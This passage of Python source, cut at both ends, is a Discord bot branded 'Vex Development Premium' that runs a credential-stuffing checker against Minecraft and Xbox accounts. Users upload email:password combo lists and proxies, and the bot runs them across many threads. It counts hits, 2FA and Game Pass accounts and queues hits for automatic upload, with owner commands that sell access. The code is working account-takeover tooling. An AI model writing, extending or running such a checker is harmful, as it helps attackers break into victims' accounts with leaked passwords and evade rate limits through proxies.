            'checked': 0,
            'total': 0,
            'hits': 0,
            'bad': 0,
            'twofa': 0,
            'sfa': 0,
            'mfa': 0,
            'xgp': 0,
            'xgpu': 0,
            'other': 0,
            'vm': 0,
            'errors': 0,
            'retries': 0,
            'unbanned': 0,
            'banned_count': 0,
            'start_time': datetime.now()
        }
        
    async def send_status_update(self):
        """Send status update to Discord channel with improved embeds"""
        if not self.is_running:
            return
            
        elapsed = datetime.now() - self.stats['start_time']
        hours, remainder = divmod(elapsed.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        progress_percent = (self.stats['checked'] / self.stats['total']) * 100 if self.stats['total'] > 0 else 0
        
        # Create progress bar
        bar_length = 10
        filled = int(bar_length * progress_percent / 100)
        progress_bar = "<:emoji_1:1451271149445976177>" * filled + "<:emoji_2:1451271185810854020>" * (bar_length - filled)
        
        embed = discord.Embed(
            title="<a:stolen_emoji_blaze:1450911473252569260> **Checker Status** • **Live Monitoring**",
            description=f"Progress Tracker\n{progress_bar} **{progress_percent:.1f}%**",
            color=0x00D9FF,
            timestamp=datetime.now()
        )
        
        embed.add_field(
            name="<a:stolen_emoji_blaze:1450914181292359692> **Checking Progress**",
            value=f"<a:stolen_emoji_blaze:1450915997576859739> Checked: {self.stats['checked']}/{self.stats['total']}\n<a:stolen_emoji_blaze:1450914724769173665> Completion: {progress_percent:.1f}%",
            inline=False
        )
        
        embed.add_field(
            name="<a:stolen_emoji_blaze:1450912362327572602> **Success Results**",
            value=f"<a:stolen_emoji_blaze:1450917298629247078> Hits: {self.stats['hits']}\n<:emoji_11:1450904476247392357>  SFA: {self.stats['sfa']}\n<a:stolen_emoji_blaze:1450917546428469368> MFA: {self.stats['mfa']}\n<:emoji_6:1450698265011032127> Valid Mail: {self.stats['vm']}",
            inline=True
        )
        
        embed.add_field(
            name="<a:emoji_9:1450903287606804632> **Failed Results**",
            value=f"<a:stolen_emoji_blaze:1450920468306464820> Bad: {self.stats['bad']}\n<a:emoji_9:1450903287606804632> 2FA: {self.stats['twofa']}\n<a:stolen_emoji_blaze:1450909317434835108> Errors: {self.stats['errors']}",
            inline=True
        )
        
        embed.add_field(
            name="<a:stolen_emoji_blaze:1450910347954229440> **Xbox Game Pass**",
            value=f"<a:stolen_emoji_blaze:1450906252711559466> XGP = {self.stats['xgp']}\n<a:stolen_emoji_blaze:1450911839146999879> XGPU = {self.stats['xgpu']}\n<a:stolen_emoji_blaze:1450916900157784147> Other = {self.stats['other']}",
            inline=True
        )
        
        embed.add_field(
            name="<a:emoji_10:1450904133728206879> **Ban Status Overview**",
            value=f"<a:stolen_emoji_blaze:1450908885677248593> Unbanned: {self.stats['unbanned']}\n<a:stolen_emoji_blaze:1450908986860634304> Banned: {self.stats['banned_count']}",
            inline=True
        )
        
        embed.add_field(
            name="<a:stolen_emoji_blaze:1450914724769173665> **Technical Statistics**",
            value=f"<a:stolen_emoji_blaze:1450914181292359692> Retries: {self.stats['retries']}\n<a:emoji_7:1450698237060321301> Duration: {int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}",
            inline=True
        )
        
        embed.set_footer(text=f"Session: {self.session_id[:16]}... • Vex Development Premium", 
                        icon_url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
        embed.set_thumbnail(url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
        
        try:
            await self.ctx.send(embed=embed)
        except Exception as e:
            print(f"Failed to send status update: {e}")

    async def run_checker(self):
        """Run the checker in a separate thread"""
        try:
            # Load configuration
            loadconfig()
            
            # Load combos
            success, message = Load(self.combos_file)
            if not success:
                await self.ctx.send(f"<a:emoji_9:1450903287606804632> {message}")
                return
            
            self.stats['total'] = len(Combos)
            
            # Setup proxy type globally
            global proxytype, screen
            proxytype = self.proxy_type
            screen = "'2'"  # Log mode
            
            # Load proxies if provided and needed
            if self.proxies_file and proxytype != "'4'" and proxytype != "'5'":
                success, message = Proxys(self.proxies_file)
                if not success:
                    await self.ctx.send(f"<a:emoji_9:1450903287606804632> {message}")
                    return
            
            # Auto scrape proxies if selected
            if proxytype == "'5'":
                await self.ctx.send("<a:stolen_emoji_blaze:1450914998028337267> Scraping proxies...")
                threading.Thread(target=get_proxies, daemon=True).start()
                # Wait for proxies to be scraped
                max_wait = 30
                waited = 0
                while len(proxylist) == 0 and waited < max_wait:
                    await asyncio.sleep(1)
                    waited += 1
                if len(proxylist) == 0:
                    await self.ctx.send("<a:emoji_9:1450903287606804632> Failed to scrape proxies. Switching to proxyless mode.")
                    proxytype = "'4'"
            
            # Create results directory
            global fname
            fname = f"discord_check_{self.session_id}"
            if not os.path.exists(f"results/{fname}"):
                os.makedirs(f"results/{fname}")
            
            # Start status updates
            asyncio.create_task(self.status_loop())
            
            # Send starting message
            embed = discord.Embed(
                title="<a:stolen_emoji_blaze:1450915319161032734> **Checker Initialized Successfully**",
                color=0x00FF7F,
                description=f"# System Ready\nChecking **{self.stats['total']} accounts** using **{self.threads} threads**",
                timestamp=datetime.now()
            )
            embed.add_field(name="<a:stolen_emoji_blaze:1450915480452731034> **Proxy Configuration**", value=f"```{self.get_proxy_type_name()}```", inline=True)
            embed.add_field(name="<a:stolen_emoji_blaze:1450915696199336077> **Session Identifier**", value=f"```{self.session_id[:16]}...```", inline=True)
            embed.add_field(name="<a:stolen_emoji_blaze:1450906252711559466> **Status**", value="```Running```", inline=True)
            embed.set_footer(text="Vex Development Premium • Checker Engine v2.0", icon_url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
            embed.set_thumbnail(url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
            await self.ctx.send(embed=embed)
            
            # Run checker in a separate thread to avoid blocking the event loop
            loop = asyncio.get_running_loop()
            await loop.run_in_executor(None, self._run_checker_blocking)
            
            # Send final summary
            await self.send_final_summary("<a:emoji_10:1450904133728206879> Checker Completed")
            
        except Exception as e:
            await self.ctx.send(f"<a:emoji_9:1450903287606804632> Checker error: {str(e)}")
            print(f"Checker error: {traceback.format_exc()}")
        finally:
            # Cleanup
            if self.session_id in active_checkers:
                del active_checkers[self.session_id]
            
            # Clean up temporary files
            try:
                if os.path.exists(self.combos_file):
                    os.remove(self.combos_file)
                if self.proxies_file and os.path.exists(self.proxies_file):
                    os.remove(self.proxies_file)
            except:
                pass

    def _run_checker_blocking(self):
        """Blocking method that runs the ThreadPoolExecutor work in a separate thread"""
        global session_webhook_url
        session_webhook_url = self.webhook_url
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.safe_checker, combo) for combo in Combos]
            
            for future in concurrent.futures.as_completed(futures):
                if not self.is_running:
                    break
                try:
                    future.result()
                except Exception as e:
                    self.stats['errors'] += 1

    def safe_checker(self, combo):
        """Wrapper for Checker function that updates stats"""
        if not self.is_running:
            return
            
        try:
            # Store current global values
            global hits, bad, twofa, sfa, mfa, xgp, xgpu, other, vm, errors, retries, checked, unbanned, banned_count
            
            # Call your existing Checker function
            Checker(combo)
            
            # Update stats from global variables
            self.stats['checked'] = checked
            self.stats['hits'] = hits
            self.stats['bad'] = bad
            self.stats['twofa'] = twofa
            self.stats['sfa'] = sfa
            self.stats['mfa'] = mfa
            self.stats['xgp'] = xgp
            self.stats['xgpu'] = xgpu
            self.stats['other'] = other
            self.stats['vm'] = vm
            self.stats['errors'] = errors
            self.stats['retries'] = retries
            self.stats['unbanned'] = unbanned
            self.stats['banned_count'] = banned_count
            
        except Exception as e:
            self.stats['errors'] += 1

    def get_proxy_type_name(self):
        proxy_names = {
            "'1'": "HTTP",
            "'2'": "SOCKS4", 
            "'3'": "SOCKS5",
            "'4'": "None",
            "'5'": "Auto Scraper"
        }
        return proxy_names.get(self.proxy_type, "Unknown")

    async def status_loop(self):
        """Send status updates every 10 seconds"""
        while self.is_running and self.stats['checked'] < self.stats['total']:
            await self.send_status_update()
            await asyncio.sleep(10)

    async def send_final_summary(self, title="🏁 Checker Completed"):
        """Send final summary when checker completes or is stopped"""
        elapsed = datetime.now() - self.stats['start_time']
        hours, remainder = divmod(elapsed.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        embed = discord.Embed(
            title=f"{'<a:stolen_emoji_blaze:1450915997576859739>' if self.stats['checked'] >= self.stats['total'] else '<a:stolen_emoji_blaze:1450908986860634304>'} **{title}**",
            color=0x00FF7F if self.stats['checked'] >= self.stats['total'] else 0xFF8C00,
            timestamp=datetime.now()
        )
        
        # Add status based on completion
        if self.stats['checked'] < self.stats['total']:
            embed.description = f"# Session Terminated\n**Stopped by user** • {self.stats['checked']}/{self.stats['total']} accounts processed"
        else:
            embed.description = f"# Session Complete\n**Successfully completed** • All {self.stats['total']} accounts checked"
        
        embed.add_field(
            name="<a:emoji_7:1450698237060321301> **Final Results**",
            value=f"<a:stolen_emoji_blaze:1450912362327572602> Hits: {self.stats['hits']}\n<a:emoji_9:1450903287606804632> Bad: {self.stats['bad']}\n<a:stolen_emoji_blaze:1450916900157784147> 2FA: {self.stats['twofa']}\n<a:stolen_emoji_blaze:1450917298629247078> SFA: {self.stats['sfa']}\n<a:stolen_emoji_blaze:1450917127732330737> MFA: {self.stats['mfa']}",
            inline=True
        )
        
        embed.add_field(
            name="<a:stolen_emoji_blaze:1450917546428469368> **Account Types**",
            value=f"<a:stolen_emoji_blaze:1450906252711559466> XGP = {self.stats['xgp']}\n<a:stolen_emoji_blaze:1450911170105049188> XGPU = {self.stats['xgpu']}\n<a:stolen_emoji_blaze:1450911839146999879> Other = {self.stats['other']}\n<a:stolen_emoji_blaze:1450916900157784147> Valid Mail = {self.stats['vm']}",
            inline=True
        )
        
        embed.add_field(
            name="<a:emoji_8:1450903309014536216> **Ban Overview**",
            value=f"<a:stolen_emoji_blaze:1450908885677248593> Unbanned: {self.stats['unbanned']}\n<a:stolen_emoji_blaze:1450908986860634304> Banned: {self.stats['banned_count']}```",
            inline=True
        )
        
        embed.add_field(
            name="<:stolen_emoji_blaze:1450912068701130956> **Session Statistics**",
            value=f"<:emoji_1:1450698111172214805> Duration: {int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}\n<a:stolen_emoji_blaze:1450906252711559466> Total: {self.stats['total']}\n<a:stolen_emoji_blaze:1450912362327572602> Checked: {self.stats['checked']}\n<a:stolen_emoji_blaze:1450918343509934141> Errors: {self.stats['errors']}\n<a:stolen_emoji_blaze:1450914998028337267> Retries: {self.stats['retries']}",
            inline=True
        )
        
        embed.set_footer(text=f"Session ID: {self.session_id} • Vex Development Premium", icon_url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
        embed.set_thumbnail(url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
        
        await self.ctx.send(embed=embed)
        
        # Send to webhook if provided
        if self.webhook_url:
            await self.send_webhook_summary()

    async def send_webhook_summary(self):
        """Send summary to webhook"""
        webhook_data = {
            "username": "Vex Development Premium",
            "avatar_url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png",
            "embeds": [{
                "title": "<a:stolen_emoji_blaze:1450911473252569260> **Checker Session Summary**",
                "description": "**Final Results Report**",
                "color": 0x00D9FF,
                "fields": [
                    {"name": "<a:stolen_emoji_blaze:1450918989512441967> **Total Accounts**", "value": f"{str(self.stats['total'])}", "inline": True},
                    {"name": "<a:stolen_emoji_blaze:1450912362327572602> **Checked**", "value": f"{str(self.stats['checked'])}", "inline": True},
                    {"name": "<a:stolen_emoji_blaze:1450917298629247078> **Hits**", "value": f"{str(self.stats['hits'])}", "inline": True},
                    {"name": "<a:emoji_9:1450903287606804632> **Bad**", "value": f"{str(self.stats['bad'])}", "inline": True},
                    {"name": "<a:stolen_emoji_blaze:1450916900157784147> **2FA**", "value": f"{str(self.stats['twofa'])}", "inline": True},
                    {"name": "\u200b", "value": "\u200b", "inline": True},
                    {"name": "<a:stolen_emoji_blaze:1450914998028337267> **Session ID**", "value": f"{self.session_id[:16]}...", "inline": False}
                ],
                "footer": {
                    "text": "Vex Development Premium • Webhook Summary",
                    "icon_url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png"
                },
                "timestamp": datetime.now(timezone.utc).isoformat()
            }]
        }
        
        try:
            requests.post(self.webhook_url, json=webhook_data)
        except Exception as e:
            print(f"Failed to send webhook: {e}")

@bot.event
async def on_ready():
    global synced_commands
    print(f'🤖 {bot.user} has logged in!')
    print(f'👑 Owner ID: {OWNER_ID}')
    print(f'📝 Authorized Users: {len(AUTHORIZED_USERS)}')
    
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="Vex Development"
        )
    )
    
    # Start background tasks for auto upload
    if not banned_hits_uploader.is_running():
        banned_hits_uploader.start()
        print("✅ Started banned hits uploader (10 min interval)")
    
    if not unbanned_hits_uploader.is_running():
        unbanned_hits_uploader.start()
        print("✅ Started unbanned hits uploader (5 min interval)")
    
    # Sync slash commands only once
    if not synced_commands:
        try:
            synced = await bot.tree.sync()
            synced_commands = True
            print(f"✅ Synced {len(synced)} slash command(s)")
        except Exception as e:
            print(f"❌ Failed to sync slash commands: {e}")

# Owner Commands
@bot.tree.command(name="grant", description="[OWNER] Grant access to a user")
async def grant_access(interaction: discord.Interaction, user_id: str):
    """Grant access to a user (Owner only)"""
    if not OWNER_ID or interaction.user.id != OWNER_ID:
        await interaction.response.send_message("<a:emoji_9:1450903287606804632> This command is only available to the bot owner.", ephemeral=True)
        return
    
    try:
        user_id_int = int(user_id)
        AUTHORIZED_USERS.add(user_id_int)
        
        # Save to file
        with open('authorized_users.txt', 'a') as f:
            f.write(f"{user_id_int}\n")
        
        embed = discord.Embed(
            title="<a:stolen_emoji_blaze:1450912362327572602> **Access Granted Successfully**",
            description=f"User **{user_id_int}** has been authorized\n\n<a:stolen_emoji_blaze:1450907292173336607> They can now access all bot features!",
            color=0x00FF7F,
            timestamp=datetime.now()
        )
        embed.set_footer(text="Vex Development Premium • Access Control", icon_url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
        await interaction.response.send_message(embed=embed)
        print(f"<a:stolen_emoji_blaze:1450912362327572602> Granted access to user: {user_id_int}")
    except ValueError:
        await interaction.response.send_message("<a:emoji_9:1450903287606804632> Invalid user ID format.", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"<a:emoji_9:1450903287606804632> Error: {str(e)}", ephemeral=True)

@bot.tree.command(name="revoke", description="[OWNER] Revoke access from a user")
async def revoke_access(interaction: discord.Interaction, user_id: str):
    """Revoke access from a user (Owner only)"""
    if not OWNER_ID or interaction.user.id != OWNER_ID:
        await interaction.response.send_message("<a:emoji_9:1450903287606804632> This command is only available to the bot owner.", ephemeral=True)
        return
    
    try:
        user_id_int = int(user_id)
        if user_id_int in AUTHORIZED_USERS:
            AUTHORIZED_USERS.remove(user_id_int)
            
            # Update file
            with open('authorized_users.txt', 'r') as f:
                lines = f.readlines()
            with open('authorized_users.txt', 'w') as f:
                for line in lines:
                    if line.strip() != str(user_id_int):
                        f.write(line)
            
            embed = discord.Embed(
                title="<a:stolen_emoji_blaze:1450920468306464820> **Access Revoked Successfully**",
                description=f"User **{user_id_int}** authorization removed\n\n<a:stolen_emoji_blaze:1450906800273489940> They can no longer access bot features.",
                color=0xFF4444,
                timestamp=datetime.now()
            )
            embed.set_footer(text="Vex Development Premium • Access Control", icon_url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
            await interaction.response.send_message(embed=embed)
            print(f"<a:stolen_emoji_blaze:1450920468306464820> Revoked access from user: {user_id_int}")
        else:
            await interaction.response.send_message("<a:emoji_9:1450903287606804632> User does not have access.", ephemeral=True)
    except ValueError:
        await interaction.response.send_message("<a:emoji_9:1450903287606804632> Invalid user ID format.", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"<a:emoji_9:1450903287606804632> Error: {str(e)}", ephemeral=True)

@bot.tree.command(name="whitelist", description="[OWNER] View all authorized users")
async def view_whitelist(interaction: discord.Interaction):
    """View all authorized users (Owner only)"""
    if not OWNER_ID or interaction.user.id != OWNER_ID:
        await interaction.response.send_message("<a:emoji_9:1450903287606804632> This command is only available to the bot owner.", ephemeral=True)
        return
    
    embed = discord.Embed(
        title="<a:stolen_emoji_blaze:1450921103030747136> **Authorized Users Whitelist**",
        description=f"# Total Users: **{len(AUTHORIZED_USERS)}**",
        color=0x00D9FF,
        timestamp=datetime.now()
    )
    
    if AUTHORIZED_USERS:
        users_text = "\n".join([f"<a:stolen_emoji_blaze:1450915997576859739> `{user_id}`" for user_id in sorted(AUTHORIZED_USERS)])
        embed.add_field(name="<:stolen_emoji_blaze:1450921374385180885> **Authorized User IDs**", value=users_text, inline=False)
    else:
        embed.add_field(name="<:stolen_emoji_blaze:1450921374385180885> **Authorized User IDs**", value="```No users authorized yet```", inline=False)
    
    embed.set_footer(text="Vex Development Premium • Access Control", icon_url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
    embed.set_thumbnail(url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
    
    embed.set_footer(text=f"Owner ID: {OWNER_ID}")
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="botstats", description="[OWNER] View bot statistics")
async def bot_stats(interaction: discord.Interaction):
    """View bot statistics (Owner only)"""
    if not OWNER_ID or interaction.user.id != OWNER_ID:
        await interaction.response.send_message("<a:emoji_9:1450903287606804632> This command is only available to the bot owner.", ephemeral=True)
        return
    
    active_sessions_count = len([s for s in active_checkers.values() if s.is_running])
    total_sessions = len(active_checkers)
    
    embed = discord.Embed(
        title="<a:stolen_emoji_blaze:1450921673120546947> **Bot Analytics Dashboard**",
        description="# System Overview",
        color=0xFFD700,
        timestamp=datetime.now()
    )
    
    embed.add_field(
        name="<:stolen_emoji_blaze:1450921911394500629> **User Statistics**",
        value=f"<a:stolen_emoji_blaze:1450912362327572602> Authorized: {len(AUTHORIZED_USERS)}\n<a:stolen_emoji_blaze:1450915480452731034> Servers: {len(bot.guilds)}",
        inline=True
    )
    
    embed.add_field(
        name="<a:emoji_10:1450904133728206879> **Session Management**",
        value=f"<a:stolen_emoji_blaze:1450908885677248593> Active: {active_sessions_count}\n<a:stolen_emoji_blaze:1450921673120546947> Total: {total_sessions}",
        inline=True
    )
    
    embed.add_field(
        name="<a:stolen_emoji_blaze:1450917546428469368>  **Upload Queues**",
        value=f"<a:stolen_emoji_blaze:1450908986860634304> Banned: {len(banned_hits_queue)}\n<a:stolen_emoji_blaze:1450908885677248593> Unbanned: {len(unbanned_hits_queue)}",
        inline=True
    )
    
    embed.set_footer(text=f"Bot Owner: {interaction.user.name} • Vex Development Premium", icon_url=interaction.user.avatar.url if interaction.user.avatar else None)
    embed.set_thumbnail(url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
    await interaction.response.send_message(embed=embed, ephemeral=True)

# Slash commands
@bot.tree.command(name="check", description="Start checking Minecraft accounts")
async def check(interaction: discord.Interaction, threads: int, proxy_type: str, webhook_url: str = None):
    """Start a new checker session"""
    # Check authorization
    if not is_authorized(interaction.user.id):
        embed = discord.Embed(
            title="<a:emoji_9:1450903287606804632> **Access Denied**",
            description="# Authorization Required\n\n<a:emoji_9:1450903287606804632> You are not authorized to use this bot.\n\n❔ **Need Access?**\nPlease contact the bot owner for authorization.",
            color=0xFF4444,
            timestamp=datetime.now()
        )
        embed.set_footer(text="Vex Development Premium • Access Control", icon_url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer()
    
    # Validate threads
    if threads < 1 or threads > 50:
        await interaction.followup.send("<a:emoji_9:1450903287606804632> Threads must be between 1 and 50")
        return
    
    # Validate proxy type
    proxy_map = {
        '1': "'1'", 'http': "'1'",
        '2': "'2'", 'socks4': "'2'", 
        '3': "'3'", 'socks5': "'3'",
        '4': "'4'", 'none': "'4'",
        '5': "'5'", 'auto': "'5'"
    }
    
    if proxy_type.lower() not in proxy_map:
        await interaction.followup.send("<a:emoji_9:1450903287606804632> Invalid proxy type. Use: `1` (Http/s), `2` (Socks4), `3` (Socks5), `4` (None), `5` (Auto Scraper)")
        return
    
    mapped_proxy_type = proxy_map[proxy_type.lower()]
    
    # Check if user already has active session
    user_sessions = [s for s in active_checkers.values() if s.ctx.author.id == interaction.user.id and s.is_running]
    if user_sessions:
        await interaction.followup.send("<a:emoji_9:1450903287606804632> You already have an active checker session. Use `/stop` to stop it first.")
        return
    
    # Send initial setup message
    embed = discord.Embed(
        title="<a:stolen_emoji_blaze:1450923562251587678> **Checker Configuration**",
        description="# Setup In Progress\nPlease upload your files to begin checking",
        color=0x5865F2,
        timestamp=datetime.now()
    )
    embed.add_field(name="<a:stolen_emoji_blaze:1450914724769173665> **Threads**", value=f"```{str(threads)}```", inline=True)
    embed.add_field(name="<a:stolen_emoji_blaze:1450915480452731034> **Proxy Type**", value=f"```{proxy_type}```", inline=True)
    embed.add_field(name="<a:stolen_emoji_blaze:1450923943786713292> **Webhook**", value=f"```{webhook_url[:30] + '...' if webhook_url and len(webhook_url) > 30 else webhook_url or 'Not configured'}```", inline=True)
    embed.set_footer(text="Vex Development Premium • File Upload Required", icon_url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
    embed.set_thumbnail(url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
    
    await interaction.followup.send(embed=embed)
    await interaction.followup.send("<:stolen_emoji_blaze:1450924139291345127> **Please upload your combos file now** (text file with email:password format):")
    
    def check_attachment(message):
        return (message.author == interaction.user and 
                message.channel == interaction.channel and 
                message.attachments and 
                message.attachments[0].filename.endswith('.txt'))
    
    try:
        attachment_msg = await bot.wait_for('message', check=check_attachment, timeout=60.0)
        combos_attachment = attachment_msg.attachments[0]
        
        # Download the combos file
        combos_content = await combos_attachment.read()
        combos_path = f"temp_combos_{interaction.id}.txt"
        
        with open(combos_path, 'wb') as f:
            f.write(combos_content)
        
        # Verify combos file has content
        with open(combos_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            if len(lines) == 0:
                await interaction.followup.send("<a:emoji_9:1450903287606804632> The provided combos file is empty.")
                os.remove(combos_path)
                return
        
        # Delete the upload message for cleanliness
        try:
            await attachment_msg.delete()
        except:
            pass
            
        await interaction.followup.send(f"<a:stolen_emoji_blaze:1450912362327572602> **Combos loaded**: {len(lines)} accounts")
        
    except asyncio.TimeoutError:
        await interaction.followup.send("<a:emoji_9:1450903287606804632> File upload timed out. Please try the command again.")
        return
    except Exception as e:
        await interaction.followup.send(f"<a:emoji_9:1450903287606804632> Error reading combos file: {str(e)}")
        return
    
    proxies_path = None
    # Ask for proxies file if proxy type requires it
    if mapped_proxy_type != "'4'" and mapped_proxy_type != "'5'":
        await interaction.followup.send("<a:stolen_emoji_blaze:1450915480452731034> **Optional**: Upload your proxies file or type `skip` to continue without proxies:")
        
        def check_proxy_attachment_or_skip(message):
            return (message.author == interaction.user and 
                    message.channel == interaction.channel and 
                    ((message.attachments and message.attachments[0].filename.endswith('.txt')) or
                     message.content.lower().strip() in ['skip', 'no', 'none']))
        
        try:
            proxy_msg = await bot.wait_for('message', check=check_proxy_attachment_or_skip, timeout=30.0)
            
            if proxy_msg.attachments:
                proxies_attachment = proxy_msg.attachments[0]
                
                # Download the proxies file
                proxies_content = await proxies_attachment.read()
                proxies_path = f"temp_proxies_{interaction.id}.txt"
                
                with open(proxies_path, 'wb') as f:
                    f.write(proxies_content)
                
                # Verify proxies file has content
                with open(proxies_path, 'r', encoding='utf-8') as f:
                    proxy_lines = f.readlines()
                    if len(proxy_lines) == 0:
                        await interaction.followup.send("<a:stolen_emoji_blaze:1450909317434835108> The provided proxies file is empty. Continuing without proxies.")
                        proxies_path = None
                    else:
                        await interaction.followup.send(f"<a:stolen_emoji_blaze:1450912362327572602> **Proxies loaded**: {len(proxy_lines)} proxies")
                
                # Delete the upload message for cleanliness
                try:
                    await proxy_msg.delete()
                except:
                    pass
                    
            else:
                await interaction.followup.send("<a:stolen_emoji_blaze:1450920468306464820> Continuing without proxies.")
                
        except asyncio.TimeoutError:
            await interaction.followup.send("<a:stolen_emoji_blaze:1450920468306464820> Proxies upload timed out. Continuing without proxies.")
    
    # Create a context-like object for the session
    class ContextLike:
        def __init__(self, interaction):
            self.author = interaction.user
            self.channel = interaction.channel
            self.send = interaction.followup.send
            self.id = interaction.id
    
    ctx_like = ContextLike(interaction)
    
    # Create checker session
    session = CheckerSession(ctx_like, threads, mapped_proxy_type, combos_path, proxies_path, webhook_url)
    active_checkers[session.session_id] = session
    
    # Start checker in background
    asyncio.create_task(session.run_checker())

from discord import app_commands

@bot.tree.command(name="stop", description="Stop checking sessions")
@app_commands.describe(session_id="ID of the session you want to stop")
async def stop(interaction: discord.Interaction, session_id: str | None = None):
    # Check authorization
    if not is_authorized(interaction.user.id):
        embed = discord.Embed(
            title="<a:stolen_emoji_blaze:1450906800273489940> **Access Denied**",
            description="# Authorization Required\n\n<a:emoji_9:1450903287606804632> You are not authorized to use this bot.\n\n<a:stolen_emoji_blaze:1450911170105049188> **Need Access?**\nPlease contact the bot owner for authorization.",
            color=0xFF4444,
            timestamp=datetime.now()
        )
        embed.set_footer(text="Vex Development Premium • Access Control", icon_url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    try:
        await interaction.response.defer(thinking=True)

        stopped_sessions = []

        # --- Stop specific session ---
        if session_id:
            session = active_checkers.get(session_id)

            if not session:
                return await interaction.followup.send("<a:emoji_9:1450903287606804632> Session not found or already completed.")

            if session.ctx.author.id != interaction.user.id:
                return await interaction.followup.send("<a:emoji_9:1450903287606804632> You can only stop **your own** sessions.")

            session.is_running = False
            stopped_sessions.append(session)

            await interaction.followup.send(f"<a:stolen_emoji_blaze:1450908986860634304> Stopped checker session `{session_id}`")

        # --- Stop all user's sessions ---
        else:
            user_sessions = [
                s for s in active_checkers.values()
                if s.ctx.author.id == interaction.user.id and s.is_running
            ]

            if not user_sessions:
                return await interaction.followup.send("<a:emoji_9:1450903287606804632> You don't have any active checker sessions.")

            for session in user_sessions:
                session.is_running = False
                stopped_sessions.append(session)

            await interaction.followup.send(f"<a:stolen_emoji_blaze:1450908986860634304> Stopped **{len(stopped_sessions)}** checker session(s).")

        # --- Send Summary for each ---
        for session in stopped_sessions:
            try:
                await session.send_final_summary("<a:stolen_emoji_blaze:1450908986860634304> Checker Stopped")
            except Exception as e:
                print("Error sending summary:", e)

    except Exception as e:
        # Last safety response (prevents "did not respond")
        try:
            await interaction.followup.send(f"<a:emoji_9:1450903287606804632> Error occurred: `{e}`")
        except:
            pass



@bot.tree.command(name="status", description="Check session status")
async def status(interaction: discord.Interaction, session_id: str = None):
    """Check status of running sessions"""
    # Check authorization
    if not is_authorized(interaction.user.id):
        embed = discord.Embed(
            title="<a:stolen_emoji_blaze:1450906800273489940> **Access Denied**",
            description="# Authorization Required\n\n<a:emoji_9:1450903287606804632> You are not authorized to use this bot.\n\n<a:stolen_emoji_blaze:1450911170105049188> **Need Access?**\nPlease contact the bot owner for authorization.",
            color=0xFF4444,
            timestamp=datetime.now()
        )
        embed.set_footer(text="Vex Development Premium • Access Control", icon_url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer()
    
    if session_id:
        # Specific session status
        if session_id in active_checkers:
            session = active_checkers[session_id]
            if session.ctx.author.id != interaction.user.id:
                await interaction.followup.send("<a:emoji_9:1450903287606804632> You can only check your own sessions.")
                return
            
            # Create a context-like object for the session
            class ContextLike:
                def __init__(self, interaction):
                    self.author = interaction.user
                    self.channel = interaction.channel
                    self.send = interaction.followup.send
                    self.id = interaction.id
            
            ctx_like = ContextLike(interaction)
            session.ctx = ctx_like
            await session.send_status_update()
        else:
            await interaction.followup.send("<a:emoji_9:1450903287606804632> Session not found or completed.")
    else:
        # All user sessions
        user_sessions = [s for s in active_checkers.values() 
                        if s.ctx.author.id == interaction.user.id and s.is_running]
        
        if not user_sessions:
            await interaction.followup.send("<a:emoji_9:1450903287606804632> You don't have any active checker sessions.")
            return
        
        embed = discord.Embed(
            title="<a:stolen_emoji_blaze:1450914998028337267> **Your Active Sessions**",
            description="# Currently Running",
            color=0x5865F2,
            timestamp=datetime.now()
        )
        
        for session in user_sessions:
            progress = f"{session.stats['checked']}/{session.stats['total']} ({session.stats['checked']/session.stats['total']*100:.1f}%)"
            embed.add_field(
                name=f"<a:stolen_emoji_blaze:1450915696199336077> **Session** `{session.session_id[:8]}...`",
                value=f"```yaml\nProgress: {progress}\nHits: {session.stats['hits']}```",
                inline=True
            )
        
        embed.set_footer(text="Vex Development Premium • Session Manager", icon_url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
        embed.set_thumbnail(url="https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png")
        
        await interaction.followup.send(embed=embed)

@bot.tree.command(name="list", description="List all active sessions")
async def list_sessions(interaction: discord.Interaction):
    """List all active sessions"""
    # Check authorization
    if not is_authorized(interaction.user.id):
        embed = discord.Embed(
            title="<a:stolen_emoji_blaze:1450909317434835108> **Access Denied**",
            description="# Authorization Required\n\n<a:emoji_9:1450903287606804632> You are not authorized to use this bot.\n\n<a:stolen_emoji_blaze:1450911170105049188> **Need Access?**\nPlease contact the bot owner for authorization.",
